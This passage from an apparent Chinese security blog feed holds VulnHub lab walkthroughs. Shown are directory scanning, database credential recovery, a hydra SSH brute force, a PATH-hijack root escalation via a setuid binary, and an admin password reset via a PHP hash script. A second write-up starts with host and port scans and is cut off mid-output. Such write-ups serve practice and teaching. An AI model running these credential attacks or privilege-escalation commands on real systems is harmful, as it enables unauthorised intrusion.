<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Target: http://192.168.159.153/</span><br><span class="line"></span><br><span class="line">[10:04:35] Starting: </span><br><span class="line">[10:04:35] 200 -    2KB - /images/                                         </span><br><span class="line">[10:04:35] 301 -  319B  - /images  -&gt;  http://192.168.159.153/images/      </span><br><span class="line">[10:04:36] 403 -  280B  - /icons/                                          </span><br><span class="line">[10:04:36] 200 -    6KB - /index.php                                       </span><br><span class="line">[10:04:37] 301 -  320B  - /uploads  -&gt;  http://192.168.159.153/uploads/    </span><br><span class="line">[10:04:37] 200 -    1KB - /uploads/                                        </span><br><span class="line">[10:04:42] 301 -  316B  - /css  -&gt;  http://192.168.159.153/css/            </span><br><span class="line">[10:04:42] 200 -    1KB - /css/                                            </span><br><span class="line">[10:04:42] 301 -  321B  - /template  -&gt;  http://192.168.159.153/template/  </span><br><span class="line">[10:04:42] 200 -    2KB - /template/                                       </span><br><span class="line">[10:04:44] 301 -  317B  - /core  -&gt;  http://192.168.159.153/core/          </span><br><span class="line">[10:04:44] 200 -    3KB - /core/                                           </span><br><span class="line">[10:04:44] 301 -  320B  - /install  -&gt;  http://192.168.159.153/install/    </span><br><span class="line">[10:04:44] 200 -    2KB - /install/                                        </span><br><span class="line">[10:04:44] 301 -  319B  - /manual  -&gt;  http://192.168.159.153/manual/      </span><br><span class="line">[10:04:44] 200 -  676B  - /manual/                                         </span><br><span class="line">[10:04:47] 301 -  315B  - /js  -&gt;  http://192.168.159.153/js/              </span><br><span class="line">[10:04:47] 200 -    2KB - /js/                                             </span><br><span class="line">[10:04:49] 301 -  323B  - /javascript  -&gt;  http://192.168.159.153/javascript/</span><br><span class="line">[10:04:49] 403 -  280B  - /javascript/                                     </span><br><span class="line">[10:04:52] 200 -    0B  - /check.php                                       </span><br><span class="line">[10:04:54] 200 -    1KB - /sf/                                             </span><br><span class="line">[10:04:54] 301 -  315B  - /sf  -&gt;  http://192.168.159.153/sf/              </span><br><span class="line">[10:04:57] 200 -  470B  - /readme.txt                                       </span><br><span class="line">[10:04:58] 200 -   26B  - /robots.txt                                       </span><br><span class="line">[10:07:34] 200 -  746B  - /backups/                                         </span><br><span class="line">[10:07:34] 301 -  320B  - /backups  -&gt;  http://192.168.159.153/backups/</span><br><span class="line">[10:09:34] 301 -  318B  - /batch  -&gt;  http://192.168.159.153/batch/          </span><br><span class="line">[10:09:34] 200 -  945B  - /batch/                                            </span><br><span class="line">[10:32:26] 403 -  280B  - /server-status/                                     </span><br><span class="line">[10:32:26] 403 -  280B  - /server-status                                      </span><br><span class="line">                                                                                </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
<p>有个 <code>/install/</code>
，或许可以重装，利用前面所得数据库信息重装</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404180911033.png" /></p>
<p>但依旧无法登录……继续折腾数据库</p>
<p>尝试用 mysql 写 shell 也没成功【<a
href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">MySQL写shell
| 狼组安全团队公开知识库</a>】</p>
<p>找到个 staff 数据库，从中得到了一些用户名和密码</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404180936293.png" /></p>
<p>username</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Smith  </span><br><span class="line">Lucas  </span><br><span class="line">Travis </span><br><span class="line">Dexter</span><br><span class="line">Meyer</span><br></pre></td></tr></table></figure>
<p>password base64解码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c3VSSkFkR3dMcDhkeTNyRg==</span><br><span class="line">suRJAdGwLp8dy3rF</span><br><span class="line">N1p3VjRxdGc0MmNtVVhHWA==</span><br><span class="line">7ZwV4qtg42cmUXGX</span><br><span class="line">WDdNUWtQM1cyOWZld0hkQw==</span><br><span class="line">X7MQkP3W29fewHdC</span><br><span class="line">REpjZVZ5OThXMjhZN3dMZw==</span><br><span class="line">DJceVy98W28Y7wLg</span><br><span class="line">Y3FObkJXQ0J5UzJEdUpTeQ==</span><br><span class="line">cqNnBWCByS2DuJSy</span><br></pre></td></tr></table></figure>
<p>hydra 爆破 ssh</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181047010.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[22][ssh] host: 192.168.159.153   login: travis   password: DJceVy98W28Y7wLg</span><br><span class="line">[22][ssh] host: 192.168.159.153   login: dexter   password: 7ZwV4qtg42cmUXGX</span><br></pre></td></tr></table></figure>
<p>可见用户名要小写，且 user 和 login 表并不是基于 id 对应的……</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>ssh 依次登录</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181140374.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181140376.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<p>传个 pspy64 监视执行 get_access 有什么特点……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181141226.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181141225.png" /></p>
<p>可见，每次执行 get_access 时都会以 root 权限调用 cat
命令来读取系统信息，尝试替换 cat 来提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/			<span class="comment"># 可写目录	</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt; <span class="built_in">cat</span>		<span class="comment"># 把/bin/bash写入到cat中。</span></span><br><span class="line"><span class="built_in">chmod</span> +x <span class="built_in">cat</span>					<span class="comment"># 增加执行权限</span></span><br><span class="line"><span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span>         <span class="comment"># 修改$PATH 变量，添加当前路径到系统路径中</span></span><br><span class="line">/opt/get_access           <span class="comment"># 触发 cat 提权</span></span><br><span class="line">``````</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181202417.png)</span><br><span class="line"></span><br><span class="line">拿到 flag  </span><br><span class="line"></span><br><span class="line"><span class="comment">## 3. 补充</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 3.1. 修改 qdpm 的登录密码</span></span><br><span class="line"></span><br><span class="line">下载 qdPM 源码 【[Free Web-Based Project Management - qdPM Project Management, Time Tracking, Support Tickets, Open Source](https://qdpm.net/)】看看加密函数，</span><br><span class="line"></span><br><span class="line">`qdPM_9.3\install\actions\install_qdpm.php` 找到了加密操作</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181350899.png)</span><br><span class="line"></span><br><span class="line">根据提示看看 `/core/lib/PasswordHash.php` ，利用里面的函数生成个 <span class="built_in">hash</span> 来替换原先的【[PHP 在线工具 | 菜鸟工具](https://www.jyshare.com/compile/1/)】  </span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">class PasswordHash &#123;</span><br><span class="line">	var <span class="variable">$itoa64</span>;</span><br><span class="line">	var <span class="variable">$iteration_count_log2</span>;</span><br><span class="line">	var <span class="variable">$portable_hashes</span>;</span><br><span class="line">	var <span class="variable">$random_state</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> __construct(<span class="variable">$iteration_count_log2</span>, <span class="variable">$portable_hashes</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;itoa64 = <span class="string">&#x27;./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$iteration_count_log2</span> &lt; 4 || <span class="variable">$iteration_count_log2</span> &gt; 31)</span><br><span class="line">			<span class="variable">$iteration_count_log2</span> = 8;</span><br><span class="line">		<span class="variable">$this</span>-&gt;iteration_count_log2 = <span class="variable">$iteration_count_log2</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$this</span>-&gt;portable_hashes = <span class="variable">$portable_hashes</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$this</span>-&gt;random_state = microtime();</span><br><span class="line">		<span class="keyword">if</span> (function_exists(<span class="string">&#x27;getmypid&#x27;</span>))</span><br><span class="line">			<span class="variable">$this</span>-&gt;random_state .= getmypid();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> get_random_bytes(<span class="variable">$count</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    /*</span><br><span class="line">		<span class="keyword">if</span> (is_readable(<span class="string">&#x27;/dev/urandom&#x27;</span>) &amp;&amp;</span><br><span class="line">		    (<span class="variable">$fh</span> = @fopen(<span class="string">&#x27;/dev/urandom&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))) &#123;</span><br><span class="line">			<span class="variable">$output</span> = fread(<span class="variable">$fh</span>, <span class="variable">$count</span>);</span><br><span class="line">			fclose(<span class="variable">$fh</span>);</span><br><span class="line">		&#125;</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (strlen(<span class="variable">$output</span>) &lt; <span class="variable">$count</span>) &#123;</span><br><span class="line">			<span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$count</span>; <span class="variable">$i</span> += 16) &#123;</span><br><span class="line">				<span class="variable">$this</span>-&gt;random_state =</span><br><span class="line">				    md5(microtime() . <span class="variable">$this</span>-&gt;random_state);</span><br><span class="line">				<span class="variable">$output</span> .=</span><br><span class="line">				    pack(<span class="string">&#x27;H*&#x27;</span>, md5(<span class="variable">$this</span>-&gt;random_state));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$output</span> = substr(<span class="variable">$output</span>, 0, <span class="variable">$count</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">return</span> <span class="variable">$output</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> encode64(<span class="variable">$input</span>, <span class="variable">$count</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="variable">$i</span> = 0;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="variable">$value</span> = ord(<span class="variable">$input</span>[<span class="variable">$i</span>++]);</span><br><span class="line">			<span class="variable">$output</span> .= <span class="variable">$this</span>-&gt;itoa64[<span class="variable">$value</span> &amp; 0x3f];</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$i</span> &lt; <span class="variable">$count</span>)</span><br><span class="line">				<span class="variable">$value</span> |= ord(<span class="variable">$input</span>[<span class="variable">$i</span>]) &lt;&lt; <span class="string">8;</span></span><br><span class="line"><span class="string">			$output .= $this-&gt;itoa64[($value &gt;&gt; 6) &amp; 0x3f];</span></span><br><span class="line"><span class="string">			if ($i++ &gt;= $count)</span></span><br><span class="line"><span class="string">				break;</span></span><br><span class="line"><span class="string">			if ($i &lt; $count)</span></span><br><span class="line"><span class="string">				$value |= ord($input[$i]) &lt;&lt; 16;</span></span><br><span class="line"><span class="string">			$output .= $this-&gt;itoa64[($value &gt;&gt; 12) &amp; 0x3f];</span></span><br><span class="line"><span class="string">			if ($i++ &gt;= $count)</span></span><br><span class="line"><span class="string">				break;</span></span><br><span class="line"><span class="string">			$output .= $this-&gt;itoa64[($value &gt;&gt; 18) &amp; 0x3f];</span></span><br><span class="line"><span class="string">		&#125; while ($i &lt; $count);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		return $output;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	function gensalt_private($input)</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		$output = &#x27;$P$&#x27;;</span></span><br><span class="line"><span class="string">		$output .= $this-&gt;itoa64[min($this-&gt;iteration_count_log2 +</span></span><br><span class="line"><span class="string">			((PHP_VERSION &gt;= &#x27;5&#x27;) ? 5 : 3), 30)];</span></span><br><span class="line"><span class="string">		$output .= $this-&gt;encode64($input, 6);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		return $output;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	function crypt_private($password, $setting)</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		$output = &#x27;*0&#x27;;</span></span><br><span class="line"><span class="string">		if (substr($setting, 0, 2) == $output)</span></span><br><span class="line"><span class="string">			$output = &#x27;*1&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		$id = substr($setting, 0, 3);</span></span><br><span class="line"><span class="string">		# We use &quot;$P$&quot;, phpBB3 uses &quot;$H$&quot; for the same thing</span></span><br><span class="line"><span class="string">		if ($id != &#x27;$P$&#x27; &amp;&amp; $id != &#x27;$H$&#x27;)</span></span><br><span class="line"><span class="string">			return $output;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		$count_log2 = strpos($this-&gt;itoa64, $setting[3]);</span></span><br><span class="line"><span class="string">		if ($count_log2 &lt; 7 || $count_log2 &gt; 30)</span></span><br><span class="line"><span class="string">			return $output;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		$count = 1 &lt;&lt; $count_log2;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		$salt = substr($setting, 4, 8</span>);</span><br><span class="line">		<span class="keyword">if</span> (strlen(<span class="variable">$salt</span>) != 8)</span><br><span class="line">			<span class="built_in">return</span> <span class="variable">$output</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment"># We&#x27;re kind of forced to use MD5 here since it&#x27;s the only</span></span><br><span class="line">		<span class="comment"># cryptographic primitive available in all versions of PHP</span></span><br><span class="line">		<span class="comment"># currently in use.  To implement our own low-level crypto</span></span><br><span class="line">		<span class="comment"># in PHP would result in much worse performance and</span></span><br><span class="line">		<span class="comment"># consequently in lower iteration counts and hashes that are</span></span><br><span class="line">		<span class="comment"># quicker to crack (by non-PHP code).</span></span><br><span class="line">		<span class="keyword">if</span> (PHP_VERSION &gt;= <span class="string">&#x27;5&#x27;</span>) &#123;</span><br><span class="line">			<span class="variable">$hash</span> = md5(<span class="variable">$salt</span> . <span class="variable">$password</span>, TRUE);</span><br><span class="line">			<span class="keyword">do</span> &#123;</span><br><span class="line">				<span class="variable">$hash</span> = md5(<span class="variable">$hash</span> . <span class="variable">$password</span>, TRUE);</span><br><span class="line">			&#125; <span class="keyword">while</span> (--<span class="variable">$count</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$hash</span> = pack(<span class="string">&#x27;H*&#x27;</span>, md5(<span class="variable">$salt</span> . <span class="variable">$password</span>));</span><br><span class="line">			<span class="keyword">do</span> &#123;</span><br><span class="line">				<span class="variable">$hash</span> = pack(<span class="string">&#x27;H*&#x27;</span>, md5(<span class="variable">$hash</span> . <span class="variable">$password</span>));</span><br><span class="line">			&#125; <span class="keyword">while</span> (--<span class="variable">$count</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$output</span> = substr(<span class="variable">$setting</span>, 0, 12);</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable">$this</span>-&gt;encode64(<span class="variable">$hash</span>, 16);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">return</span> <span class="variable">$output</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> gensalt_extended(<span class="variable">$input</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$count_log2</span> = min(<span class="variable">$this</span>-&gt;iteration_count_log2 + 8, 24);</span><br><span class="line">		<span class="comment"># This should be odd to not reveal weak DES keys, and the</span></span><br><span class="line">		<span class="comment"># maximum valid value is (2**24 - 1) which is odd anyway.</span></span><br><span class="line">		<span class="variable">$count</span> = (1 &lt;&lt; <span class="variable">$count_log2</span>) - 1;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$output</span> = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable">$this</span>-&gt;itoa64[<span class="variable">$count</span> &amp; 0x3f];</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable">$this</span>-&gt;itoa64[(<span class="variable">$count</span> &gt;&gt; 6) &amp; 0x3f];</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable">$this</span>-&gt;itoa64[(<span class="variable">$count</span> &gt;&gt; 12) &amp; 0x3f];</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable">$this</span>-&gt;itoa64[(<span class="variable">$count</span> &gt;&gt; 18) &amp; 0x3f];</span><br><span class="line"></span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable">$this</span>-&gt;encode64(<span class="variable">$input</span>, 3);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">return</span> <span class="variable">$output</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> gensalt_blowfish(<span class="variable">$input</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment"># This one needs to use a different order of characters and a</span></span><br><span class="line">		<span class="comment"># different encoding scheme from the one in encode64() above.</span></span><br><span class="line">		<span class="comment"># We care because the last character in our encoded string will</span></span><br><span class="line">		<span class="comment"># only represent 2 bits.  While two known implementations of</span></span><br><span class="line">		<span class="comment"># bcrypt will happily accept and correct a salt string which</span></span><br><span class="line">		<span class="comment"># has the 4 unused bits set to non-zero, we do not want to take</span></span><br><span class="line">		<span class="comment"># chances and we also do not want to waste an additional byte</span></span><br><span class="line">		<span class="comment"># of entropy.</span></span><br><span class="line">		<span class="variable">$itoa64</span> = <span class="string">&#x27;./ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$output</span> = <span class="string">&#x27;$2a$&#x27;</span>;</span><br><span class="line">		<span class="variable">$output</span> .= chr(ord(<span class="string">&#x27;0&#x27;</span>) + <span class="variable">$this</span>-&gt;iteration_count_log2 / 10);</span><br><span class="line">		<span class="variable">$output</span> .= chr(ord(<span class="string">&#x27;0&#x27;</span>) + <span class="variable">$this</span>-&gt;iteration_count_log2 % 10);</span><br><span class="line">		<span class="variable">$output</span> .= <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$i</span> = 0;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="variable">$c1</span> = ord(<span class="variable">$input</span>[<span class="variable">$i</span>++]);</span><br><span class="line">			<span class="variable">$output</span> .= <span class="variable">$itoa64</span>[<span class="variable">$c1</span> &gt;&gt; 2];</span><br><span class="line">			<span class="variable">$c1</span> = (<span class="variable">$c1</span> &amp; 0x03) &lt;&lt; <span class="string">4;</span></span><br><span class="line"><span class="string">			if ($i &gt;= 16) &#123;</span></span><br><span class="line"><span class="string">				$output .= $itoa64[$c1];</span></span><br><span class="line"><span class="string">				break;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">			$c2 = ord($input[$i++]);</span></span><br><span class="line"><span class="string">			$c1 |= $c2 &gt;&gt; 4</span>;</span><br><span class="line">			<span class="variable">$output</span> .= <span class="variable">$itoa64</span>[<span class="variable">$c1</span>];</span><br><span class="line">			<span class="variable">$c1</span> = (<span class="variable">$c2</span> &amp; 0x0f) &lt;&lt; <span class="string">2;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">			$c2 = ord($input[$i++]);</span></span><br><span class="line"><span class="string">			$c1 |= $c2 &gt;&gt; 6;</span></span><br><span class="line"><span class="string">			$output .= $itoa64[$c1];</span></span><br><span class="line"><span class="string">			$output .= $itoa64[$c2 &amp; 0x3f];</span></span><br><span class="line"><span class="string">		&#125; while (1);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		return $output;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	function HashPassword($password)</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		$random = &#x27;&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /*</span></span><br><span class="line"><span class="string">		if (CRYPT_BLOWFISH == 1 &amp;&amp; !$this-&gt;portable_hashes) &#123;</span></span><br><span class="line"><span class="string">			$random = $this-&gt;get_random_bytes(16);</span></span><br><span class="line"><span class="string">			$hash =</span></span><br><span class="line"><span class="string">			    crypt($password, $this-&gt;gensalt_blowfish($random));</span></span><br><span class="line"><span class="string">			if (strlen($hash) == 60)</span></span><br><span class="line"><span class="string">				return $hash;</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		if (CRYPT_EXT_DES == 1 &amp;&amp; !$this-&gt;portable_hashes) &#123;</span></span><br><span class="line"><span class="string">			if (strlen($random) &lt; 3)</span></span><br><span class="line"><span class="string">				$random = $this-&gt;get_random_bytes(3);</span></span><br><span class="line"><span class="string">			$hash =</span></span><br><span class="line"><span class="string">			    crypt($password, $this-&gt;gensalt_extended($random));</span></span><br><span class="line"><span class="string">			if (strlen($hash) == 20)</span></span><br><span class="line"><span class="string">				return $hash;</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">		*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		if (strlen($random) &lt; 6)</span></span><br><span class="line"><span class="string">			$random = $this-&gt;get_random_bytes(6);</span></span><br><span class="line"><span class="string">		$hash =</span></span><br><span class="line"><span class="string">		    $this-&gt;crypt_private($password,</span></span><br><span class="line"><span class="string">		    $this-&gt;gensalt_private($random));</span></span><br><span class="line"><span class="string">		if (strlen($hash) == 34)</span></span><br><span class="line"><span class="string">			return $hash;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		# Returning &#x27;*&#x27; on error is safe here, but would _not_ be safe</span></span><br><span class="line"><span class="string">		# in a crypt(3)-like function used _both_ for generating new</span></span><br><span class="line"><span class="string">		# hashes and for validating passwords against existing hashes.</span></span><br><span class="line"><span class="string">		return &#x27;*&#x27;;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	function CheckPassword($password, $stored_hash)</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		$hash = $this-&gt;crypt_private($password, $stored_hash);</span></span><br><span class="line"><span class="string">		if ($hash[0] == &#x27;*&#x27;)</span></span><br><span class="line"><span class="string">			$hash = crypt($password, $stored_hash);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		return $hash == $stored_hash;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$hasher = new PasswordHash(11, false);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$administrator_password = &#x27;123456&#x27;;</span></span><br><span class="line"><span class="string">$hashed_password = $hasher-&gt;HashPassword($administrator_password);</span></span><br><span class="line"><span class="string">$trimmed_escaped_hashed_password = trim(addslashes($hashed_password));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo $trimmed_escaped_hashed_password;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得 <code>$P$E0LB.ps5CD9nBJkGz2k0k6ER9NjbE90</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181356503.png" /></p>
<p>登录 <code>admin@localhost.com/123456</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181428732.png" /></p>
<p>测试历史漏洞都未成功……</p>
<h3 id="get_access-源码">3.2. get_access 源码</h3>
<p>ida 对 get_access 反汇编</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181207492.png" /></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setuid(<span class="number">0</span>);    <span class="comment">// 提权</span></span><br><span class="line">  setgid(<span class="number">0</span>);    <span class="comment">//  提权</span></span><br><span class="line">  system(<span class="string">&quot;cat /root/system.info&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Could not create socket to access to the system.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;All services are disabled. Accessing to the system is allowed only within working hours.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>shell</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Napping: 1.0.1</title>
    <url>/2024/04/16/Napping%201.0.1/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/napping-101,752/">Napping: 1.0.1 ~
VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts                </span><br><span class="line">9 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 540            </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">192.168.159.2   00:50:56:e0:3a:a5      4     240  VMware, Inc.         </span><br><span class="line">192.168.159.1   00:50:56:c0:00:08      1      60  VMware, Inc.         </span><br><span class="line">192.168.159.254 00:50:56:e4:0d:9b      2     120  VMware, Inc.              </span><br><span class="line">192.168.159.149 00:0c:29:50:e3:9f      2     120  VMware, Inc.  </span><br></pre></td></tr></table></figure>
<p>靶机：192.168.159.149</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-14 05:05 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.149 (192.168.159.149)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 24:c4:<span class="built_in">fc</span>:dc:4b:f4:31:a0:ad:0d:20:61:fd:ca:ab:79 (RSA)</span><br><span class="line">|   256 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be (ECDSA)</span><br><span class="line">|_  256 af:01:85:cf:<span class="built_in">dd</span>:43:e9:8d:32:50:83:b2:41:ec:1d:3b (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-title: Login</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">MAC Address: 00:0C:29:50:E3:9F (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.09 ms 192.168.159.149 (192.168.159.149)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 14.10 